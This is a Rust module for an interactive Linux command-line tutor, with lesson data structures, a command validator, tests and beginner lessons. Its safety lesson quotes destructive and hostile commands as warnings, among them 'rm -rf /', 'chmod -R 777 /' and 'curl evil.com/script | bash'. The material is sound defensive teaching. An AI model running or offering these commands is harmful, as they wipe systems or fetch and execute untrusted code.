//! Interactive lesson system for teaching Linux/Bash concepts
//!
//! This module provides a comprehensive framework for creating, validating,
//! and tracking progress through interactive lessons.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// A complete lesson module (e.g., "Navigation Basics")
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Lesson {
    pub id: String,
    pub title: String,
    pub description: String,
    pub difficulty: Difficulty,
    pub estimated_minutes: u32,
    pub steps: Vec<LessonStep>,
    pub prerequisites: Vec<String>, // IDs of lessons that should be completed first
    pub tags: Vec<String>,          // e.g., ["beginner", "navigation", "essential"]
}

/// Difficulty level of a lesson
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Difficulty {
    Beginner,
    Intermediate,
    Advanced,
    Expert,
}

/// A single step within a lesson
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LessonStep {
    pub step_number: u32,
    pub title: String,
    pub instruction: String,
    pub hint: Option<String>,
    pub step_type: StepType,
}

/// Type of lesson step
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum StepType {
    /// User must execute a specific command
    CommandExercise {
        expected_command: String,
        validation: CommandValidation,
        success_message: String,
    },
    /// Multiple choice question
    MultipleChoice {
        question: String,
        options: Vec<String>,
        correct_index: usize,
        explanation: String,
    },
    /// Fill in the blank in a command
    FillInBlank {
        template: String,       // e.g., "ls {flags} /home"
        correct_answers: Vec<String>, // e.g., ["-la", "-l -a"]
        explanation: String,
    },
    /// Information/explanation only (no validation)
    Information {
        content: String,
    },
    /// Free-form practice with validation
    Practice {
        goal: String,
        validation: PracticeValidation,
        hints: Vec<String>,
    },
}

/// How to validate a command exercise
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CommandValidation {
    /// Exact command match (ignoring whitespace)
    Exact,
    /// Command and flags must match (args can vary)
    CommandAndFlags,
    /// Just the base command must match
    CommandOnly,
    /// Custom validation with regex
    Regex(String),
    /// Multiple acceptable commands
    AnyOf(Vec<String>),
}

/// Validation for practice exercises
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PracticeValidation {
    /// File exists at path
    FileExists(String),
    /// Directory exists at path
    DirectoryExists(String),
    /// File contains specific content
    FileContains { path: String, content: String },
    /// Command output matches pattern
    OutputMatches { command: String, pattern: String },
    /// Custom validator (description only, actual validation in engine)
    Custom(String),
}

/// Progress tracking for a user through lessons
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LessonProgress {
    pub lesson_id: String,
    pub current_step: u32,
    pub completed_steps: Vec<u32>,
    pub started_at: chrono::DateTime<chrono::Utc>,
    pub completed_at: Option<chrono::DateTime<chrono::Utc>>,
    pub attempts: HashMap<u32, u32>, // step_number -> attempt_count
}

impl LessonProgress {
    pub fn new(lesson_id: String) -> Self {
        Self {
            lesson_id,
            current_step: 1,
            completed_steps: Vec::new(),
            started_at: chrono::Utc::now(),
            completed_at: None,
            attempts: HashMap::new(),
        }
    }

    pub fn is_completed(&self) -> bool {
        self.completed_at.is_some()
    }

    pub fn completion_percentage(&self, total_steps: u32) -> f32 {
        if total_steps == 0 {
            return 0.0;
        }
        (self.completed_steps.len() as f32 / total_steps as f32) * 100.0
    }

    pub fn record_attempt(&mut self, step_number: u32) {
        *self.attempts.entry(step_number).or_insert(0) += 1;
    }

    pub fn complete_step(&mut self, step_number: u32) {
        if !self.completed_steps.contains(&step_number) {
            self.completed_steps.push(step_number);
            self.completed_steps.sort();
        }
    }

    pub fn complete_lesson(&mut self) {
        self.completed_at = Some(chrono::Utc::now());
    }
}

/// Lesson library that stores all available lessons
pub struct LessonLibrary {
    lessons: HashMap<String, Lesson>,
}

impl LessonLibrary {
    pub fn new() -> Self {
        let mut library = Self {
            lessons: HashMap::new(),
        };
        library.load_default_lessons();
        library
    }

    /// Register a lesson in the library
    pub fn register(&mut self, lesson: Lesson) {
        self.lessons.insert(lesson.id.clone(), lesson);
    }

    /// Get a lesson by ID
    pub fn get(&self, id: &str) -> Option<&Lesson> {
        self.lessons.get(id)
    }

    /// Get all lessons
    pub fn all(&self) -> Vec<&Lesson> {
        self.lessons.values().collect()
    }

    /// Get lessons by difficulty
    pub fn by_difficulty(&self, difficulty: Difficulty) -> Vec<&Lesson> {
        self.lessons
            .values()
            .filter(|l| l.difficulty == difficulty)
            .collect()
    }

    /// Get lessons by tag
    pub fn by_tag(&self, tag: &str) -> Vec<&Lesson> {
        self.lessons
            .values()
            .filter(|l| l.tags.iter().any(|t| t == tag))
            .collect()
    }

    /// Load default lessons (initial set)
    fn load_default_lessons(&mut self) {
        self.register(create_navigation_basics_lesson());
        self.register(create_file_management_lesson());
        self.register(create_safety_lesson());
        // More lessons to be added
    }
}

impl Default for LessonLibrary {
    fn default() -> Self {
        Self::new()
    }
}

/// Lesson validation engine
pub struct LessonValidator {
    // For now, just basic validation
    // Will expand with actual command execution and output checking
}

impl LessonValidator {
    pub fn new() -> Self {
        Self {}
    }

    /// Validate a command exercise
    pub fn validate_command(
        &self,
        user_input: &str,
        expected: &str,
        validation: &CommandValidation,
    ) -> ValidationResult {
        match validation {
            CommandValidation::Exact => {
                let normalized_input = user_input.trim().split_whitespace().collect::<Vec<_>>().join(" ");
                let normalized_expected = expected.trim().split_whitespace().collect::<Vec<_>>().join(" ");

                if normalized_input == normalized_expected {
                    ValidationResult::Success {
                        message: "Perfect! That's exactly right.".to_string(),
                    }
                } else {
                    ValidationResult::Failure {
                        message: format!("Not quite. Expected: {}", expected),
                        hint: Some("Check the command and flags carefully.".to_string()),
                    }
                }
            }
            CommandValidation::CommandOnly => {
                let user_cmd = user_input.trim().split_whitespace().next().unwrap_or("");
                let expected_cmd = expected.trim().split_whitespace().next().unwrap_or("");

                if user_cmd == expected_cmd {
                    ValidationResult::Success {
                        message: "Correct command!".to_string(),
                    }
                } else {
                    ValidationResult::Failure {
                        message: format!("Wrong command. Expected: {}", expected_cmd),
                        hint: None,
                    }
                }
            }
            CommandValidation::AnyOf(commands) => {
                let normalized_input = user_input.trim().split_whitespace().collect::<Vec<_>>().join(" ");

                for cmd in commands {
                    let normalized_cmd = cmd.trim().split_whitespace().collect::<Vec<_>>().join(" ");
                    if normalized_input == normalized_cmd {
                        return ValidationResult::Success {
                            message: "Correct!".to_string(),
                        };
                    }
                }

                ValidationResult::Failure {
                    message: "Not quite. Try one of the expected commands.".to_string(),
                    hint: Some(format!("Expected one of: {}", commands.join(" OR "))),
                }
            }
            _ => ValidationResult::Success {
                message: "Validation passed (stub)".to_string(),
            },
        }
    }

    /// Validate a multiple choice answer
    pub fn validate_multiple_choice(&self, user_choice: usize, correct: usize) -> ValidationResult {
        if user_choice == correct {
            ValidationResult::Success {
                message: "Correct!".to_string(),
            }
        } else {
            ValidationResult::Failure {
                message: "Not quite. Try again!".to_string(),
                hint: None,
            }
        }
    }
}

impl Default for LessonValidator {
    fn default() -> Self {
        Self::new()
    }
}

/// Result of validating user input for a lesson step
#[derive(Debug, Clone)]
pub enum ValidationResult {
    Success { message: String },
    Failure { message: String, hint: Option<String> },
    Partial { message: String, progress: f32 },
}

impl ValidationResult {
    pub fn is_success(&self) -> bool {
        matches!(self, ValidationResult::Success { .. })
    }
}

// ============================================================================
// Default Lesson Definitions
// ============================================================================

/// Create the "Navigation Basics" lesson
fn create_navigation_basics_lesson() -> Lesson {
    Lesson {
        id: "nav-basics".to_string(),
        title: "Navigation Basics".to_string(),
        description: "Learn how to navigate the Linux filesystem using essential commands like ls, cd, pwd, and tree.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 10,
        prerequisites: vec![],
        tags: vec!["beginner".to_string(), "navigation".to_string(), "essential".to_string()],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Understanding Your Current Location".to_string(),
                instruction: "Every time you open a terminal, you're in a specific directory. Let's find out where you are. Type the command to print your current working directory.".to_string(),
                hint: Some("The command is 'pwd' (print working directory)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "pwd".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! 'pwd' shows your current directory. This is your starting point.".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Listing Files and Directories".to_string(),
                instruction: "Now let's see what's in your current directory. Use the command to list all files and directories.".to_string(),
                hint: Some("The command is 'ls' (list)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! 'ls' shows you what's in the current directory.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Detailed File Listings".to_string(),
                instruction: "Let's get more information about the files. Use 'ls' with flags to show a long, detailed listing with human-readable file sizes.".to_string(),
                hint: Some("Try 'ls -lh' (long format + human-readable sizes)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -lh".to_string(),
                    validation: CommandValidation::AnyOf(vec![
                        "ls -lh".to_string(),
                        "ls -hl".to_string(),
                        "ls -l -h".to_string(),
                        "ls -h -l".to_string(),
                    ]),
                    success_message: "Excellent! The -l flag shows details like permissions, owner, size, and date. The -h flag makes sizes human-readable (KB, MB, GB).".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Understanding Hidden Files".to_string(),
                instruction: "Many configuration files are hidden (they start with a dot). Let's see ALL files, including hidden ones.".to_string(),
                hint: Some("Use the -a flag with ls".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -a".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! Files starting with '.' are hidden. You'll see '.bashrc', '.profile', etc. - these are configuration files.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Changing Directories".to_string(),
                instruction: "Let's move to your home directory. Use the change directory command with the ~ symbol (tilde represents your home).".to_string(),
                hint: Some("Type 'cd ~' or just 'cd'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cd".to_string(),
                    validation: CommandValidation::AnyOf(vec![
                        "cd".to_string(),
                        "cd ~".to_string(),
                        "cd $HOME".to_string(),
                    ]),
                    success_message: "Great! 'cd' without arguments always takes you home. The ~ symbol is a shortcut for your home directory.".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Quiz: What does 'cd ..' do?".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does the command 'cd ..' do?".to_string(),
                    options: vec![
                        "Goes to the home directory".to_string(),
                        "Goes up one directory level (to the parent)".to_string(),
                        "Lists files in the current directory".to_string(),
                        "Creates a new directory".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! '..' is a special symbol that represents the parent directory. So 'cd ..' moves you up one level in the directory tree.".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Pro Tip: cd -".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Pro tip: 'cd -' is a super useful command! It takes you back to your previous directory. Try it:\n\n  cd /tmp\n  cd ~\n  cd -    # Takes you back to /tmp!\n\nThis is great for quickly switching between two directories you're working in.".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Completion: Navigation Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Congratulations! 🎉 You've mastered basic navigation!\n\nKey commands you learned:\n  • pwd  - Print working directory\n  • ls   - List files (use -l for details, -a for hidden, -h for human-readable)\n  • cd   - Change directory\n  • cd ~ - Go home\n  • cd .. - Go up one level\n  • cd -  - Toggle to previous directory\n\nThese are the foundation of navigating Linux. Practice them often!".to_string(),
                },
            },
        ],
    }
}

/// Create the "File Management" lesson
fn create_file_management_lesson() -> Lesson {
    Lesson {
        id: "file-mgmt".to_string(),
        title: "File Management Basics".to_string(),
        description: "Learn to create, copy, move, and delete files and directories safely.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 15,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["beginner".to_string(), "files".to_string(), "essential".to_string()],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Creating a Practice Directory".to_string(),
                instruction: "Let's create a safe practice space. Create a directory called 'practice' in your current location.".to_string(),
                hint: Some("Use 'mkdir practice'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "mkdir practice".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! 'mkdir' (make directory) creates a new folder. Now you have a safe space to practice.".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Creating a File".to_string(),
                instruction: "Navigate into your practice directory and create an empty file called 'test.txt'.".to_string(),
                hint: Some("Use 'cd practice' then 'touch test.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "touch test.txt".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! 'touch' creates an empty file or updates the timestamp of an existing one.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Copying Files".to_string(),
                instruction: "Make a copy of test.txt called test-backup.txt.".to_string(),
                hint: Some("Use 'cp test.txt test-backup.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cp test.txt test-backup.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! 'cp source destination' copies a file. Always make backups of important files before editing!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Moving/Renaming Files".to_string(),
                instruction: "Rename test-backup.txt to backup.txt using the move command.".to_string(),
                hint: Some("'mv' is used for both moving and renaming. Try 'mv test-backup.txt backup.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "mv test-backup.txt backup.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! 'mv' moves OR renames files. When source and destination are in the same directory, it's renaming.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Safety Quiz".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Which flag should you ALWAYS use with 'rm' for safety?".to_string(),
                    options: vec![
                        "-f (force)".to_string(),
                        "-i (interactive/confirm)".to_string(),
                        "-r (recursive)".to_string(),
                        "-v (verbose)".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! The -i flag makes rm ask for confirmation before deleting. NEVER use -f (force) unless you're absolutely sure. -r is for directories but should be used with -i for safety.".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Safe Deletion".to_string(),
                instruction: "Delete test.txt safely by using the interactive flag.".to_string(),
                hint: Some("Use 'rm -i test.txt' and confirm when prompted".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "rm -i test.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! Always use -i when deleting files. There is NO undo in Linux - deleted files are gone forever!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Completion: File Management Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Excellent work! 🎉 You've learned essential file management!\n\nKey commands:\n  • mkdir  - Create directories\n  • touch  - Create empty files\n  • cp     - Copy files\n  • mv     - Move or rename files\n  • rm -i  - Delete files (ALWAYS use -i for safety!)\n\nSafety rules:\n  ⚠️  Always use 'rm -i' not 'rm -f'\n  ⚠️  Make backups before editing important files\n  ⚠️  Be very careful with 'rm -r' (deletes directories)\n  ⚠️  NEVER run 'rm -rf /' (destroys your system!)\n\nNext: Learn text processing!".to_string(),
                },
            },
        ],
    }
}

/// Create the "What NOT to Do" safety lesson
fn create_safety_lesson() -> Lesson {
    Lesson {
        id: "safety-essentials".to_string(),
        title: "What NOT to Do - Safety Essentials".to_string(),
        description: "Critical safety lessons to prevent data loss, system damage, and security vulnerabilities. Learn the dangerous commands and practices to avoid.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 15,
        prerequisites: vec![],
        tags: vec!["beginner".to_string(), "safety".to_string(), "essential".to_string(), "security".to_string()],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Welcome to Safety Training".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "⚠️  IMPORTANT: This lesson teaches you what NOT to do!\n\nThe command line is powerful - which means it can do a LOT of damage if misused. Unlike graphical interfaces with confirmation dialogs and trash bins, the terminal executes commands IMMEDIATELY and PERMANENTLY.\n\nIn this lesson, you'll learn:\n  • Dangerous commands that can destroy your system\n  • Common mistakes beginners make\n  • Security vulnerabilities to avoid\n  • Best practices for safe command line usage\n\nThis knowledge could save you from:\n  • Losing important files forever\n  • Breaking your operating system\n  • Creating security holes\n  • Hours of recovery work\n\nLet's get started! 🛡️".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "The Most Dangerous Command".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Which command is EXTREMELY dangerous and should NEVER be run?".to_string(),
                    options: vec![
                        "rm -i file.txt".to_string(),
                        "rm -rf /".to_string(),
                        "ls -la /".to_string(),
                        "cd /tmp".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "CORRECT! 'rm -rf /' is catastrophic - it recursively force-deletes your ENTIRE system starting from the root! The -r means recursive (all files and folders), -f means force (no confirmations), and / is the root of your entire filesystem. This will destroy your operating system and all your data. Modern systems have protections, but NEVER try this. Even 'rm -rf /*' (with a star) can be devastating!".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Understanding Force Flags".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🚨 NEVER USE FORCE FLAGS UNLESS YOU'RE ABSOLUTELY CERTAIN!\n\nDangerous force flags to avoid:\n\n  • rm -f      - Deletes without asking (NO confirmation!)\n  • rm -rf     - Recursively force-deletes directories\n  • mv -f      - Overwrites files without warning\n  • cp -f      - Overwrites files without asking\n\nInstead, ALWAYS use interactive flags:\n\n  ✅ rm -i     - Asks before each deletion\n  ✅ rm -ri    - Safe recursive deletion with prompts\n  ✅ mv -i     - Asks before overwriting\n  ✅ cp -i     - Asks before overwriting\n\nRemember: Linux has NO recycle bin. Deleted = GONE FOREVER!\nThe -i flag is your safety net. Use it!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Permission Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You need to make a script executable. Which chmod command is safest?".to_string(),
                    options: vec![
                        "chmod 777 script.sh (everyone can read, write, execute)".to_string(),
                        "chmod +x script.sh (add execute permission)".to_string(),
                        "chmod -R 777 / (make everything writable)".to_string(),
                        "chmod 000 script.sh (remove all permissions)".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "CORRECT! 'chmod +x script.sh' just adds execute permission safely. \n\n❌ NEVER use chmod 777! This gives EVERYONE (including attackers) full read, write, and execute access. It's a MASSIVE security hole!\n\n❌ NEVER use chmod -R 777 on system directories! This makes your entire system vulnerable.\n\nAlways use minimal permissions:\n  • 755 for directories and executables (owner can write, others can read/execute)\n  • 644 for regular files (owner can write, others can read)\n  • Use +x, +r, +w to add specific permissions instead of numbers".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "The Sudo Trap".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🔐 SUDO GIVES YOU SUPERPOWERS - USE RESPONSIBLY!\n\nCommon sudo mistakes:\n\n❌ DON'T: Run random internet commands with sudo\n   Example: Don't blindly copy-paste 'sudo rm -rf /usr'\n\n❌ DON'T: Use sudo just because a command failed\n   Example: If 'npm install' fails, DON'T try 'sudo npm install'\n   (Fix permissions instead!)\n\n❌ DON'T: Pipe untrusted scripts to sudo bash\n   Example: curl http://example.com/script.sh | sudo bash\n   (This runs unknown code as admin!)\n\n✅ DO: Read and understand commands before using sudo\n✅ DO: Use sudo only when actually needed (system changes)\n✅ DO: Check who wrote the script you're running\n\nThink of sudo like giving someone the keys to your house - only do it when absolutely necessary and you trust the command!".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Wildcard Disasters".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You're in your home directory and want to delete all .txt files. Which is SAFEST?".to_string(),
                    options: vec![
                        "rm *.txt (could be dangerous if you're in wrong directory!)".to_string(),
                        "rm -rf *".to_string(),
                        "First 'ls *.txt' to verify, then 'rm -i *.txt'".to_string(),
                        "cd / && rm *.txt".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "CORRECT! Always verify with 'ls' FIRST, then use 'rm -i' for confirmation!\n\nWildcard disasters to avoid:\n\n❌ 'rm -rf *' - Deletes EVERYTHING in current directory!\n❌ 'rm -rf * .*' - Even worse, includes hidden files!\n❌ 'rm * .txt' - Space before .txt means delete everything AND .txt!\n\nSafety practices:\n  1️⃣  Always 'pwd' to confirm you're in the right directory\n  2️⃣  Always 'ls [pattern]' to see what matches BEFORE deleting\n  3️⃣  Always use 'rm -i' with wildcards\n  4️⃣  Be EXTRA careful with spaces in commands!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Pipe and Redirect Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "⚡ REDIRECTS CAN OVERWRITE FILES INSTANTLY!\n\nDangerous redirects:\n\n❌ command > important.txt\n   • Single > OVERWRITES the file completely!\n   • If command is empty, you just erased your file!\n\n❌ command > /etc/passwd\n   • Overwriting system files breaks your system!\n\n❌ cat file.txt > file.txt\n   • You just erased file.txt with an empty file!\n   • (Can't read and write same file this way)\n\nSafe practices:\n\n✅ command >> file.txt  (double >> appends instead of overwriting)\n✅ Always backup first: cp important.txt important.txt.bak\n✅ Test commands first: command > /tmp/test.txt\n✅ Use 'set -o noclobber' to prevent accidental overwrites\n\nRemember: > is INSTANT and PERMANENT!".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Copy-Paste from the Internet".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You found a cool command on a random website. What should you do?".to_string(),
                    options: vec![
                        "Copy-paste it immediately into your terminal".to_string(),
                        "Add sudo to make sure it works".to_string(),
                        "Read and understand what each part does, then type it yourself".to_string(),
                        "Run it in another user's account first".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "CORRECT! Always READ and UNDERSTAND commands first!\n\nInternet command safety:\n\n❌ Malicious examples you might see:\n   • curl evil.com/script | bash  (runs hidden malware!)\n   • alias ls='rm -rf /'  (makes 'ls' destroy your system!)\n   • Hidden characters that do something different than shown\n\n✅ Safe practices:\n   1️⃣  READ every part of the command\n   2️⃣  Look up unfamiliar commands with 'man' or '--help'\n   3️⃣  TYPE commands yourself (don't copy-paste!)\n   4️⃣  Be skeptical of commands that:\n      • Use sudo unnecessarily\n      • Pipe curl/wget to bash\n      • Have > redirects to system files\n      • Use rm, chmod, or other dangerous commands\n   5️⃣  Only trust official documentation\n\nWhen in doubt, ask an expert or research more!".to_string(),
                },
            },
            LessonStep {
                step_number: 9,
                title: "File System Navigation Mistakes".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🗺️  ALWAYS KNOW WHERE YOU ARE!\n\nCommon navigation mistakes:\n\n❌ Running destructive commands without checking location:\n   pwd  ← Always do this first!\n   # Oh no, I'm in / not /tmp!\n\n❌ Typos in paths with destructive commands:\n   cd /tmpp/work     ← Failed (typo)\n   rm -rf *          ← Just deleted wrong directory!\n\n❌ Assuming you're in the right directory:\n   cd ~/projects/myapp\n   # ...later...\n   rm -rf node_modules  ← Are you still in myapp?\n\nSafe practices:\n\n✅ Always 'pwd' before destructive operations\n✅ Use absolute paths for important operations:\n   rm -rf /tmp/test instead of cd /tmp && rm -rf test\n✅ Use tab completion to avoid typos\n✅ Create a habit: 'pwd' → 'ls' → then act\n✅ Be extra careful in /tmp, /, and system directories".to_string(),
                },
            },
            LessonStep {
                step_number: 10,
                title: "Hidden Files and Spaces in Names".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "👻 WATCH OUT FOR HIDDEN FILES AND SPACES!\n\nHidden file dangers:\n\n❌ rm -rf * → Deletes visible files only\n❌ rm -rf * .* → DANGEROUS! .* matches .. (parent directory!)\n✅ rm -rf * .[^.]* → Safe way to include hidden files\n\nSpaces in filenames:\n\n❌ rm my file.txt → Tries to delete 'my' and 'file.txt'\n✅ rm \"my file.txt\" → Correct (quotes protect spaces)\n✅ rm my\\ file.txt → Also correct (backslash escapes space)\n✅ Use tab completion to auto-escape spaces!\n\nOther tricky characters:\n\n❌ Files starting with - (dash) confuse commands:\n   rm -file.txt → Thinks it's a flag!\n   ✅ rm ./-file.txt → Correct way\n\n❌ Files with special characters: !@#$%^&*()\n   ✅ Always use quotes or escape them\n\nBest practice: Avoid spaces in filenames! Use underscores or dashes:\n  my-file.txt or my_file.txt".to_string(),
                },
            },
            LessonStep {
                step_number: 11,
                title: "Environment Variable Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🔧 BE CAREFUL WITH ENVIRONMENT VARIABLES!\n\nDangerous modifications:\n\n❌ export PATH=/usr/bin\n   • Overwrites entire PATH (breaks most commands!)\n   ✅ export PATH=$PATH:/usr/bin (appends instead)\n\n❌ unset PATH\n   • Makes most commands unusable!\n\n❌ Adding untrusted directories to PATH:\n   export PATH=/tmp:$PATH\n   • Now malicious /tmp/ls could run instead of real ls!\n\nSystem file dangers:\n\n❌ NEVER edit these without understanding them:\n   • /etc/passwd → User accounts\n   • /etc/fstab → Disk mounting (can prevent boot!)\n   • /etc/hosts → Network resolution\n   • /boot/* → Boot files (can break booting!)\n\n✅ Safe practices:\n   • Always backup before editing: sudo cp /etc/passwd /etc/passwd.bak\n   • Use proper editors: sudo vi /etc/hosts\n   • Test changes in your home directory first\n   • Keep recovery USB drive handy!".to_string(),
                },
            },
            LessonStep {
                step_number: 12,
                title: "Completion: Safety Knowledge Acquired!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🎓 CONGRATULATIONS! You're now aware of major dangers!\n\n🛡️  GOLDEN RULES TO REMEMBER:\n\n1️⃣  NEVER run 'rm -rf /' or 'rm -rf /*'\n2️⃣  ALWAYS use -i flag with rm, mv, cp\n3️⃣  NEVER use chmod 777 on anything\n4️⃣  ALWAYS read commands before running them\n5️⃣  NEVER blindly copy-paste from the internet\n6️⃣  ALWAYS pwd before destructive operations\n7️⃣  NEVER pipe curl to bash without reading the script\n8️⃣  ALWAYS use sudo minimally and carefully\n9️⃣  NEVER assume you're in the right directory\n🔟 ALWAYS backup important files before operations\n\n💡 When in doubt:\n  • man <command> → Read the manual\n  • <command> --help → Get help info\n  • Ask in forums/communities\n  • Test in /tmp or virtual machine first\n  • Make backups before experimenting\n\nStay safe and enjoy the power of the command line! 🚀\n\nNext: Practice these lessons in safe environments!".to_string(),
                },
            },
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lesson_progress_new() {
        let progress = LessonProgress::new("test-lesson".to_string());
        assert_eq!(progress.lesson_id, "test-lesson");
        assert_eq!(progress.current_step, 1);
        assert!(!progress.is_completed());
    }

    #[test]
    fn test_lesson_progress_completion() {
        let mut progress = LessonProgress::new("test-lesson".to_string());
        progress.complete_step(1);
        progress.complete_step(2);
        progress.complete_step(3);

        assert_eq!(progress.completion_percentage(3), 100.0);
        assert_eq!(progress.completion_percentage(6), 50.0);
    }

    #[test]
    fn test_command_validation_exact() {
        let validator = LessonValidator::new();
        let result = validator.validate_command(
            "ls -la",
            "ls -la",
            &CommandValidation::Exact,
        );
        assert!(result.is_success());

        let result = validator.validate_command(
            "ls -l",
            "ls -la",
            &CommandValidation::Exact,
        );
        assert!(!result.is_success());
    }

    #[test]
    fn test_command_validation_command_only() {
        let validator = LessonValidator::new();
        let result = validator.validate_command(
            "ls -la /home",
            "ls",
            &CommandValidation::CommandOnly,
        );
        assert!(result.is_success());
    }
}
